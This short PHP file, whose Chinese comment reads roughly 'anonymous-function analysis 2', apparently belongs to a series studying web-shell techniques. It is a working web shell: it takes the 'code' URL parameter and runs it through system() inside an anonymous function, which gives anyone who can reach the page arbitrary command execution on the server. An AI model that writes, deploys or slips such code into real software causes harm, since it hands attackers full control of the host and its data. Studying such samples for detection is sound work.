<?php
/* 
 * 匿名函数分析2
 */
$code = $_GET['code'];
$myexec = function () use ($code) {
    system($code);
};
echo $myexec();
